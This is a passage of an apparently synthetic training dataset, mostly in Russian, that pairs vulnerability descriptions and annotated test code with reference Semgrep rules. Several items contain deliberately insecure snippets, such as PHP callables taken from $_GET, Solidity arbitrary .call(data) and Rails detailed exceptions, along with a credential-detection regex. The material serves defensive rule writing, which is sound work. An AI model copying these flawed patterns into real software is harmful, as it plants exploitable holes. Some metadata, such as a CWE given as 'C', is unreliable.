    "instruction": "Создай правило Semgrep для обнаружения detailed-exceptions\nОписание уязвимости: Found that the setting for providing detailed exception reports in Rails is set to true. This can lead to information exposure, where sensitive system or internal information is displayed to the end user. Instead, turn this setting off.\nCWE: CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\nТип анализа: search\nЯзык: ruby",
    "input": "Требования:\n- Язык: ruby\n- Тип анализа: search\n- CWE: CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: detailed-exceptions.rb\nRails.application.configure do\n  # Settings specified here will take precedence over those in config/application.rb.\n\n  # Show full error reports and disable caching.\n  # ruleid: detailed-exceptions \n  config.consider_all_requests_local       = true\n  config.action_controller.perform_caching = false\n\n  # Don't care if the mailer can't send.\n  config.action_mailer.raise_delivery_errors = false\nend\n\nRails.application.configure do\n  # Settings specified here will take precedence over those in config/application.rb.\n\n  # Show full error reports and disable caching.\n  # ok: detailed-exceptions \n  config.consider_all_requests_local       = false\n  config.action_controller.perform_caching = false\n\n  # Don't care if the mailer can't send.\n  config.action_mailer.raise_delivery_errors = false\nend\n\nclass ConfigController < ApplicationController\n  # ruleid: detailed-exceptions \n  def show_detailed_exceptions?\n    return true\n  end\nend\n\nclass ConfigController < ApplicationController\n  # ok: detailed-exceptions\n  def show_detailed_exceptions?\n    return false\n  end\nend  # Ограничиваем длину\n\nОпасные паттерны:\n• config.consider_all_requests_local = true\n• def show_detailed_exceptions?(...)\n  ...\n  return true\nend\n\nБезопасные паттерны:  \n• config.consider_all_requests_local = false\n• def show_detailed_exceptions?(...)\n  ...\n  return false\nend\n\nЛегенда аннотаций:\n- // ruleid:detailed-exceptions: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:detailed-exceptions: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: detailed-exceptions\n  metadata:\n    owasp:\n    - A01:2021 - Broken Access Control\n    cwe:\n    - 'CWE-200: Exposure of Sensitive Information to an Unauthorized Actor'\n    source-rule-url: https://github.com/presidentbeef/brakeman/blob/main/lib/brakeman/checks/check_detailed_exceptions.rb\n    category: security\n    technology:\n    - rails\n    references:\n    - https://owasp.org/Top10/A01_2021-Broken_Access_Control\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n  message: >-\n    Found that the setting for providing detailed exception reports in Rails\n    is set to true. This can lead to information exposure,\n    where sensitive system or internal information is displayed to the end user. Instead, turn this setting\n    off.\n  languages: [ruby]\n  severity: WARNING\n  patterns:\n  - pattern-either:\n    - patterns:\n      - pattern: |\n          config.consider_all_requests_local = true\n    - patterns:\n      - pattern-inside: |\n          class $CONTROLLER < ApplicationController\n            ...\n          end\n      - pattern: |\n          def show_detailed_exceptions? (...)\n            ...\n          return $RETURN\n          end\n      - metavariable-pattern:\n          metavariable: $RETURN\n          patterns:\n          - pattern-not: |\n              false\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска случаев, когда в Ruby on Rails конфигурация 'config.consider_all_requests_local' установлена в true или метод контроллера 'show_detailed_exceptions?' возвращает true. Эти настройки могут привести к раскрытию подробной информации об исключениях, включая чувствительные данные системы или внутренние детали, которые нежелательно показывать конечным пользователям.\n\n# Ключевые элементы:\n- ID: detailed-exceptions\n- Язык: ruby \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "detailed-exceptions",
      "language": "ruby",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: arbitrary-low-level-call\nОписание уязвимости: An attacker may perform call() to an arbitrary address with controlled calldata\nCWE: C\nТип анализа: search\nЯзык: solidity",
    "input": "Требования:\n- Язык: solidity\n- Тип анализа: search\n- CWE: C\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: arbitrary-low-level-call.sol\n// Sources flattened with hardhat v2.7.0 https://hardhat.org\n\n// File lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol\n\n// OpenZeppelin Contracts v4.4.1 (token/ERC20/IERC20.sol)\n\npragma solidity ^0.8.0;\n\n/**\n * @dev Interface of the ERC20 standard as defined in the EIP.\n */\ninterface IERC20 {\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256);\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256);\n\n    /**\n     * @dev Moves `amount` tokens from the caller's account to `recipient`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transfer(address recipient, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n     * zero by default.\n     *\n     * This value changes when {approve} or {transferFrom} are called.\n     */\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an {Approval} event.\n     */\n    function approve(address spender, uint256 amount) external returns (  # Ограничиваем длину\n\nОпасные паттерны:\n• // ruleid: arbitrary-low-level-call\n(bool success, bytes memory result) = to.call{value: value}(data);\n• // ruleid: arbitrary-low-level-call\n(bool success, bytes memory result) = to.call{gas: value}(data);\n• // ruleid: arbitrary-low-level-call\n(bool success, bytes memory result) = to.call(data);\n\nБезопасные паттерны:  \n• IERC20 coin = IERC20(metis);\nITreasury(treasury).withdrawTokens(address(coin), address(this), coin.balanceOf(address(treasury)));\ncoin.transfer(msg.sender, reward);\n• ITreasury(treasury).withdrawTokens(address(starsToken), address(this), weeklyAmountOfToken);\n• starsToken.safeApprove(delegate, starsBalance);\n\nЛегенда аннотаций:\n- // ruleid:arbitrary-low-level-call: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:arbitrary-low-level-call: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n -\n    id: arbitrary-low-level-call\n    message: An attacker may perform call() to an arbitrary address with controlled calldata\n    metadata:\n        category: security\n        technology:\n            - solidity\n        cwe: \"CWE-20: Improper Input Validation\"\n        confidence: LOW\n        likelihood: HIGH\n        impact: HIGH\n        subcategory:\n            - vuln\n        references:\n            - https://twitter.com/CertiKAlert/status/1512198846343954445\n            - https://twitter.com/SlowMist_Team/status/1508787862791069700\n            - https://twitter.com/Beosin_com/status/1509099103401127942\n            - https://blocksecteam.medium.com/li-fi-attack-a-cross-chain-bridge-vulnerability-no-its-due-to-unchecked-external-call-c31e7dadf60f\n            - https://etherscan.io/address/0xe7597f774fd0a15a617894dc39d45a28b97afa4f # Auctus Options\n            - https://etherscan.io/address/0x73a499e043b03fc047189ab1ba72eb595ff1fc8e # Li.Fi\n    patterns:\n        - pattern-either:\n            - pattern-inside: |\n                function $F(..., address $ADDR, ..., bytes calldata $DATA, ...) external { ... }\n            - pattern-inside: |\n                function $F(..., address $ADDR, ..., bytes calldata $DATA, ...) public { ... }\n        - pattern-either:\n            - pattern: $ADDR.call($DATA);\n            - pattern: $ADDR.call{$VALUE:...}($DATA);\n            - pattern: $ADDR.call{$VALUE:..., $GAS:...}($DATA);\n    languages: \n        - solidity\n    severity: ERROR\n\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска вызовов low-level функций .call() или .call{gas:, value:}() в смарт-контрактах Solidity, которые могут быть использованы злоумышленниками для выполнения произвольных операций с контролируемыми данными вызова. Правило использует шаблон inside для поиска сигнатур функций, принимающих адрес и данные вызова, а затем проверяет вызовы .call() с различными параметрами, включая передачу значения и газа.\n\n# Ключевые элементы:\n- ID: arbitrary-low-level-call\n- Язык: solidity \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "arbitrary-low-level-call",
      "language": "solidity",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: sequelize-weak-tls-version\nОписание уязвимости: TLS1.0 and TLS1.1 are deprecated and should not be used anymore. By default, NodeJS used TLSv1.2. So, TLS min version must not be downgrade to TLS1.0 or TLS1.1. Enforce TLS1.3 is highly recommended This rule checks TLS configuration only for PostgreSQL, MariaDB and MySQL. SQLite is not really concerned by TLS configuration. This rule could be extended for MSSQL, but the dialectOptions is specific for Tedious.\nCWE: CWE-319: Cleartext Transmission of Sensitive Information\nТип анализа: search\nЯзык: javascript",
    "input": "Требования:\n- Язык: javascript\n- Тип анализа: search\n- CWE: CWE-319: Cleartext Transmission of Sensitive Information\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: sequelize-weak-tls-version.js\nmodule.exports = {\n  local: {\n    username: \"AppUser\",\n    database: \"AppDb\",\n    dialect: \"postgres\",\n    host: \"127.0.0.1\",\n    dialectOptions: {\n    // ruleid: sequelize-weak-tls-version\n      ssl: {\n        minVersion: 'TLSv1'\n      }\n    }\n  }\n};\n\nmodule.exports = {\n  local: {\n    username: \"AppUser\",\n    database: \"AppDb\",\n    dialect: \"postgres\",\n    host: \"127.0.0.1\",\n    dialectOptions: {\n    // ruleid: sequelize-weak-tls-version\n      ssl: {\n        minVersion: 'TLSv1.1'\n      }\n    }\n  }\n};\n\nmodule.exports = {\n  local: {\n    username: \"AppUser\",\n    database: \"AppDb\",\n    dialect: \"mysql\",\n    host: \"127.0.0.1\",\n    dialectOptions: {\n    // ruleid: sequelize-weak-tls-version\n      ssl: {\n        minVersion: 'TLSv1.1'\n      }\n    }\n  }\n};\n\nmodule.exports = {\n  local: {\n    username: \"AppUser\",\n    database: \"AppDb\",\n    dialect: \"mariadb\",\n    host: \"127.0.0.1\",\n    dialectOptions: {\n    // ruleid: sequelize-weak-tls-version\n      ssl: {\n        minVersion: 'TLSv1.1'\n      }\n    }\n  }\n};\n\n\nmodule.exports = {\n  local: {\n    username: \"AppUser\",\n    database: \"AppDb\",\n    dialect: \"postgres\",\n    host: \"127.0.0.1\",\n    dialectOptions: {\n    // ok: sequelize-weak-tls-version\n      ssl: {\n        minVersion: 'TLSv1.2'\n      }\n    }\n  }\n};  # Ограничиваем длину\n\nОпасные паттерны:\n• { host: \"127.0.0.1\", database: \"AppDb\", dialect: \"postgres\", dialectOptions: { ssl: { minVersion: 'TLSv1' } } }\n• { host: \"127.0.0.1\", database: \"AppDb\", dialect: \"mysql\", dialectOptions: { ssl: { minVersion: 'TLSv1.1' } } }\n\nБезопасные паттерны:  \n• { host: \"127.0.0.1\", database: \"AppDb\", dialect: \"postgres\", dialectOptions: { ssl: { minVersion: 'TLSv1.2' } } }\n• { host: \"127.0.0.1\", database: \"AppDb\", dialect: \"mariadb\", dialectOptions: { ssl: { minVersion: 'TLSv1.2' } } }\n\nЛегенда аннотаций:\n- // ruleid:sequelize-weak-tls-version: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:sequelize-weak-tls-version: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: sequelize-weak-tls-version\n  message: >-\n    TLS1.0 and TLS1.1 are deprecated and should not be used anymore.\n    By default, NodeJS used TLSv1.2.\n    So, TLS min version must not be downgrade to TLS1.0 or TLS1.1.\n    Enforce TLS1.3 is highly recommended\n    This rule checks TLS configuration only for PostgreSQL, MariaDB and\n    MySQL. SQLite is not really concerned by TLS configuration.\n    This rule could be extended for MSSQL, but the dialectOptions\n    is specific for Tedious.\n  metadata:\n    cwe:\n    - 'CWE-319: Cleartext Transmission of Sensitive Information'\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A02:2021 - Cryptographic Failures\n    references:\n    - https://node-postgres.com/features/ssl\n    - https://nodejs.org/api/tls.html#tls_class_tls_tlssocket\n    - https://nodejs.org/api/tls.html#tls_tls_createsecurecontext_options\n    - https://nodejs.org/api/tls.html#tls_tls_default_min_version\n    category: security\n    technology:\n    - sequelize\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages:\n  - javascript\n  - typescript\n  severity: WARNING\n  patterns:\n  - pattern-inside: |\n      {\n        host: $HOST,\n        database: $DATABASE,\n        dialect: $DIALECT,\n        dialectOptions:\n          { ssl: ... }\n       }\n  - pattern-either:\n    - pattern: |\n        {\n          minVersion: 'TLSv1'\n        }\n    - pattern: |\n        {\n          minVersion: 'TLSv1.1'\n        }\n  - metavariable-regex:\n      metavariable: $DIALECT\n      regex: \"['\\\"](mariadb|mysql|postgres)['\\\"]\"\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска конфигураций TLS, использующих устаревшие версии TLS (TLS1.0 или TLS1.1) в контексте диалектов базы данных PostgreSQL, MariaDB и MySQL. Оно проверяет наличие ключа 'minVersion' внутри объекта 'ssl' в конфигурации диалектов этих баз данных. Если значение этого ключа равно 'TLSv1' или 'TLSv1.1', то это считается опасным примером, так как эти версии TLS считаются небезопасными и должны быть заменены более современными версиями.\n\n# Ключевые элементы:\n- ID: sequelize-weak-tls-version\n- Язык: javascript \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "sequelize-weak-tls-version",
      "language": "javascript",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: aws-elasticache-automatic-backup-not-enabled\nОписание уязвимости: Ensure that Amazon ElastiCache clusters have automatic backup turned on. To fix this, set a `snapshot_retention_limit`.\nCWE: \nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: aws-elasticache-automatic-backup-not-enabled.tf\n# pass\n\nresource \"aws_elasticache_cluster\" \"enabled\" {\n  cluster_id           = \"cluster\"\n  engine               = \"redis\"\n  node_type            = \"cache.m5.large\"\n  num_cache_nodes      = 1\n  parameter_group_name = \"default.redis6.x\"\n\n  snapshot_retention_limit = 5\n}\n\n# failure\n# ruleid: aws-elasticache-automatic-backup-not-enabled\nresource \"aws_elasticache_cluster\" \"default\" {\n  cluster_id           = \"cluster\"\n  engine               = \"redis\"\n  node_type            = \"cache.m5.large\"\n  num_cache_nodes      = 1\n  parameter_group_name = \"default.redis6.x\"\n}\n# ruleid: aws-elasticache-automatic-backup-not-enabled\nresource \"aws_elasticache_cluster\" \"disabled\" {\n  cluster_id           = \"cluster\"\n  engine               = \"redis\"\n  node_type            = \"cache.m5.large\"\n  num_cache_nodes      = 1\n  parameter_group_name = \"default.redis6.x\"\n\n  snapshot_retention_limit = 0\n}\n\n# unknown\n\nresource \"aws_elasticache_cluster\" \"memcached\" {\n  cluster_id           = \"cluster\"\n  engine               = \"memcached\"\n  node_type            = \"cache.m5.large\"\n  num_cache_nodes      = 1\n  parameter_group_name = \"default.memcached1.6 \"\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"aws_elasticache_cluster\" \"default\" { ... }\n• resource \"aws_elasticache_cluster\" \"disabled\" { ... snapshot_retention_limit = 0 ... }\n\nБезопасные паттерны:  \n• resource \"aws_elasticache_cluster\" \"enabled\" { ... snapshot_retention_limit = 5 ... }\n• resource \"aws_elasticache_cluster\" \"memcached\" { ... engine = \"memcached\" ... }\n\nЛегенда аннотаций:\n- // ruleid:aws-elasticache-automatic-backup-not-enabled: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:aws-elasticache-automatic-backup-not-enabled: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: aws-elasticache-automatic-backup-not-enabled\n  patterns:\n  - pattern-either:\n    - patterns:\n      - pattern: |\n          resource \"aws_elasticache_cluster\" $ANYTHING {\n            ...\n          }\n      - pattern-not-inside: |\n          resource \"aws_elasticache_cluster\" $ANYTHING {\n            ...\n            engine = \"memcached\"\n            ...\n          }\n      - pattern-not-inside: |\n          resource \"aws_elasticache_cluster\" $ANYTHING {\n            ...\n            snapshot_retention_limit = ...\n            ...\n          }\n    - patterns:\n      - pattern: |\n          resource \"aws_elasticache_cluster\" $ANYTHING {\n            ...\n            snapshot_retention_limit = $LIMIT\n            ...\n          }\n      - metavariable-comparison:\n          metavariable: $LIMIT\n          comparison: $LIMIT == 0\n  message: >-\n    Ensure that Amazon ElastiCache clusters have automatic backup turned on. To fix this, set a `snapshot_retention_limit`.\n  metadata:\n    category: best-practice\n    technology:\n    - terraform\n    - aws\n  languages: [hcl]\n  severity: WARNING\n\n# Логика правила:\nЭто правило Semgrep ищет ресурсы AWS Elasticache типа 'aws_elasticache_cluster' в конфигурациях Terraform (HCL). Оно проверяет наличие параметра 'snapshot_retention_limit'. Если этот параметр отсутствует или установлен в значение 0, то правило считает это опасным состоянием, так как автоматическое создание резервных копий отключено. Правило также исключает случаи, когда используется движок memcached, поскольку он не поддерживает автоматические резервные копии.\n\n# Ключевые элементы:\n- ID: aws-elasticache-automatic-backup-not-enabled\n- Язык: hcl \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "aws-elasticache-automatic-backup-not-enabled",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения incorrect-use-sscanf-fn\nОписание уязвимости: Avoid 'sscanf()' for number conversions. Its use can lead to undefined behavior, slow processing, and integer overflows. Instead prefer the 'strto*()' family of functions.\nCWE: \nТип анализа: search\nЯзык: c",
    "input": "Требования:\n- Язык: c\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: incorrect-use-sscanf-fn.c\n#include <stdio.h>\n#include <stdlib.h>\n\nint main() {\n    const char *float_str = \"3.1415926535897932384626433832\";\n    const char *int_str = \"9999999999999999999999999\";\n    int read;\n\n    float f;\n    double d;\n    long double ld;\n\n    // ruleid:incorrect-use-sscanf-fn\n    read = sscanf(float_str, \"%f\", &f);\n\n    // ruleid:incorrect-use-sscanf-fn\n    read = sscanf(float_str, \"%lf\", &d);\n\n    // ruleid:incorrect-use-sscanf-fn\n    read = sscanf(float_str, \"%llf\", &ld);\n\n    // ruleid:incorrect-use-sscanf-fn\n    read = sscanf(float_str, \"%Lf\", &ld);\n\n    // ok:incorrect-use-sscanf-fn\n    f = strtof(float_str, NULL);\n\n    // ok:incorrect-use-sscanf-fn\n    d = strtod(float_str, NULL);\n\n    // ok:incorrect-use-sscanf-fn\n    ld = strtold(float_str, NULL);\n\n    int i;\n    long int li;\n    long long int lli;\n    unsigned int ui;\n    unsigned long int uli;\n    unsigned long long int ulli;\n\n    // ruleid:incorrect-use-sscanf-fn\n    read = sscanf(int_str, \"%d\", &i);\n\n    // ruleid:incorrect-use-sscanf-fn\n    read = sscanf(int_str, \"%ld\", &li);\n\n    // ruleid:incorrect-use-sscanf-fn\n    read = sscanf(int_str, \"%lld\", &lli);\n\n    // ruleid:incorrect-use-sscanf-fn\n    read = sscanf(int_str, \"%Ld\", &lli);\n\n    // ruleid:incorrect-use-sscanf-fn\n    read = sscanf(int_str, \"%u\", &ui);\n\n    // ruleid:incorrect-use-sscanf-fn\n    read = sscanf(int_str, \"%lu\", &uli);\n\n    // ruleid:incorrect-use-sscanf-fn\n    read = sscanf(int_str, \"%llu\", &ulli);\n\n    // ruleid:incorrect-use-sscanf-fn\n    read = sscanf(int_str, \"%Lu\", &ulli);\n\n    // ok:incorrect-use-sscanf-fn\n    li = strtol(int_str, NULL, 0);\n\n    // ok:incorrect-use-sscanf-fn\n    lli = strtoll(int_str, NULL, 0);\n\n    // ok:incorrect-use-sscanf-fn\n    uli = strtoul(int_str, NULL, 0);\n\n    // ok:incorrect-use-sscanf-fn\n    ulli = strtoull(int_str, NULL, 0);\n\n    return 0;\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• read = sscanf(float_str, \"%f\", &f);\n• read = sscanf(float_str, \"%lf\", &d);\n• read = sscanf(float_str, \"%llf\", &ld);\n\nБезопасные паттерны:  \n• f = strtof(float_str, NULL);\n• d = strtod(float_str, NULL);\n• ld = strtold(float_str, NULL);\n\nЛегенда аннотаций:\n- // ruleid:incorrect-use-sscanf-fn: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:incorrect-use-sscanf-fn: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: incorrect-use-sscanf-fn\n    patterns:\n      - pattern: sscanf($STR, $FMT, $PTR);\n      - metavariable-regex:\n          metavariable: $FMT\n          regex: '\"%(l{0,2}|L)([fegEa]|[dDiouxX])\"'\n    message: >-\n      Avoid 'sscanf()' for number conversions. Its use can lead to undefined\n      behavior, slow processing, and integer overflows. Instead prefer the\n      'strto*()' family of functions.\n    metadata:\n      references:\n        - https://stackoverflow.com/q/22865622\n        - https://stackoverflow.com/q/7021725\n        - https://www.mattkeeter.com/blog/2021-03-01-happen/\n      category: correctness\n      technology:\n        - c\n    languages: [c]\n    severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска вызовов функции sscanf(), которые используются для преобразования чисел. Паттерн ищет конкретные форматы формата, такие как '%(l{0,2}|L)[fegEa]' или '%(l{0,2}|L)[dDiouxX]', которые указывают на преобразование чисел с использованием sscanf(). Эти форматы соответствуют числовым типам, таким как float, double, long double и целые числа различных размеров. Правило рекомендует использовать вместо этого семейство функций strto*, так как они обеспечивают более безопасное и эффективное преобразование чисел.\n\n# Ключевые элементы:\n- ID: incorrect-use-sscanf-fn\n- Язык: c \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "incorrect-use-sscanf-fn",
      "language": "c",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: planetscale-oauth-token\nОписание уязвимости: A gitleaks planetscale-oauth-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: INFO\n\nКонтекст кода:\n// File: planetscale-oauth-token.go\n// ruleid: planetscale-oauth-token\nplanetScalePassword_api_token = \"pscale_oauth_132tp-ag=4set2_7yhibbj8m1-xcsk3y\"  # Ограничиваем длину\n\nОпасные паттерны:\n• // ruleid: planetscale-oauth-token\nplanetScalePassword_api_token = \"pscale_oauth_132tp-ag=4set2_7yhibbj8m1-xcsk3y\"\n• // ruleid: planetscale-oauth-token\nconst pscaleToken = 'pscale_oauth_aaa-bbb-ccc-ddd'\n• // ruleid: planetscale-oauth-token\nlet oauthToken = 'pscale_oauth_xxxxxxxx'\n\nБезопасные паттерны:  \n• // safe: no planetscale-oauth-token\nplanetScalePassword_api_token = \"randomGeneratedToken\"\n• // safe: no planetscale-oauth-token\nconst accessKey = 'aws_access_key_id=\"AKIAIOSFODNN7EXAMPLE\"'\n• // safe: no planetscale-oauth-token\nlet jwtSecret = 'jwt_secret_key=\"mysecretkey\"'\n\nЛегенда аннотаций:\n- // ruleid:planetscale-oauth-token: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:planetscale-oauth-token: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: planetscale-oauth-token\n  message: A gitleaks planetscale-oauth-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\n  languages:\n    - regex\n  severity: INFO\n  metadata:\n      likelihood: LOW\n      impact: MEDIUM\n      confidence: LOW\n      category: security\n      cwe:\n        - \"CWE-798: Use of Hard-coded Credentials\"\n      cwe2021-top25: true\n      cwe2022-top25: true\n      owasp:\n        - A07:2021 - Identification and Authentication Failures\n      references:\n        - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n      source-rule-url: https://github.com/zricethezav/gitleaks/tree/master/cmd/generate/config/rules\n      subcategory:\n        - vuln\n      technology:\n        - gitleaks\n  patterns:\n    - pattern-regex: (?i)\\b(pscale_oauth_(?i)[a-z0-9=\\-_\\.]{32,64})(?:['|\\\"|\\n|\\r|\\s|\\x60|;]|$)\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска жестко закодированных токенов OAuth PlanetScale в исходном коде. Оно ищет строку, начинающуюся с 'pscale_oauth_' за которой следует последовательность из 32-64 символов, состоящих из букв, цифр, знаков равенства, тире, подчеркивания и точки. Регулярное выражение нечувствительно к регистру благодаря флагу '(?i)', а оператор '$' указывает на конец строки или разделитель, предотвращая ложные срабатывания внутри строковых литералов.\n\n# Ключевые элементы:\n- ID: planetscale-oauth-token\n- Язык: regex \n- Тип: vuln\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "planetscale-oauth-token",
      "language": "regex",
      "severity": "INFO",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: tainted-callable\nОписание уязвимости: Callable based on user input risks remote code execution.\nCWE: CWE-94: Improper Control of Generation of Code ('Code Injection')\nТип анализа: taint\nЯзык: php\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: php\n- Тип анализа: taint\n- CWE: CWE-94: Improper Control of Generation of Code ('Code Injection')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: tainted-callable.php\n<?php\n\n$foo = [2, 1, 3];\n\n// ok: tainted-callable\nvar_dump(usort($foo, 'strcmp'));\n\n// ok: tainted-callable\nvar_dump(usort($_GET['array'], 'strcmp'));\n\n// ruleid: tainted-callable\nvar_dump(usort($foo, $_GET['sortfunc']));  # Ограничиваем длину\n\nОпасные паттерны:\n• var_dump(usort($foo, $_GET['sortfunc']));\n• array_map($_GET['callback'], $data);\n• Closure::fromCallable($_POST['callable'])();\n\nБезопасные паттерны:  \n• var_dump(usort($foo, 'strcmp'));\n• array_map('strtoupper', $data);\n• Closure::fromCallable('someSafeFunction')();\n\nЛегенда аннотаций:\n- // ruleid:tainted-callable: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:tainted-callable: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: tainted-callable\n  severity: WARNING\n  message: >-\n    Callable based on user input risks remote code execution.\n  metadata:\n    technology:\n    - php\n    category: security\n    cwe:\n    - \"CWE-94: Improper Control of Generation of Code ('Code Injection')\"\n    owasp:\n    - A03:2021 - Injection\n    references:\n    - https://www.php.net/manual/en/language.types.callable.php\n    subcategory:\n    - vuln\n    impact: HIGH\n    likelihood: MEDIUM\n    confidence: MEDIUM\n  languages: [php]\n  mode: taint\n  pattern-sources:\n  - patterns:\n    - pattern-either:\n      - pattern: $_GET\n      - pattern: $_POST\n      - pattern: $_COOKIE\n      - pattern: $_REQUEST\n      - pattern: file_get_contents('php://input')\n  pattern-sinks:\n  - patterns:\n    - pattern: $CALLABLE\n    - pattern-either:\n      - pattern-inside: $ARRAYITERATOR->uasort($CALLABLE)\n      - pattern-inside: $ARRAYITERATOR->uksort($CALLABLE)\n      - pattern-inside: $EVENTHTTP->setCallback($CALLABLE, ...)\n      - pattern-inside: $EVENTHTTPCONNECTION->setCloseCallback($CALLABLE, ...)\n      - pattern-inside: $EVLOOP->fork($CALLABLE, ...)\n      - pattern-inside: $EVLOOP->idle($CALLABLE, ...)\n      - pattern-inside: $EVLOOP->prepare($CALLABLE, ...)\n      - pattern-inside: $EVWATCHER->setCallback($CALLABLE)\n      - pattern-inside: $GEARMANCLIENT->setClientCallback($CALLABLE)\n      - pattern-inside: $GEARMANCLIENT->setCompleteCallback($CALLABLE)\n      - pattern-inside: $GEARMANCLIENT->setCreatedCallback($CALLABLE)\n      - pattern-inside: $GEARMANCLIENT->setDataCallback($CALLABLE)\n      - pattern-inside: $GEARMANCLIENT->setExceptionCallback($CALLABLE)\n      - pattern-inside: $GEARMANCLIENT->setFailCallback($CALLABLE)\n      - pattern-inside: $GEARMANCLIENT->setStatusCallback($CALLABLE)\n      - pattern-inside: $GEARMANCLIENT->setWarningCallback($CALLABLE)\n      - pattern-inside: $GEARMANCLIENT->setWorkloadCallback($CALLABLE)\n      - pattern-inside: $IMAGICK->setProgressMonitor($CALLABLE)\n      - pattern-inside: $OAUTHPROVIDER->consumerHandler($CALLABLE)\n      - pattern-inside: $OAUTHPROVIDER->tokenHandler($CALLABLE)\n      - pattern-inside: $PDO->sqliteCreateCollation($NAME, $CALLABLE)\n      - pattern-inside: $PDOSTATEMENT->fetchAll(PDO::FETCH_FUNC, $CALLABLE)\n      - pattern-inside: $SQLITE3->createCollation($NAME, $CALLABLE)\n      - pattern-inside: $SQLITE3->setAuthorizer($CALLABLE)\n      - pattern-inside: $ZIPARCHIVE->registerCancelCallback($CALLABLE)\n      - pattern-inside: $ZIPARCHIVE->registerProgressCallback($RATE, $CALLABLE)\n      - pattern-inside: $ZMQDEVICE->setIdleCallback($CALLABLE, 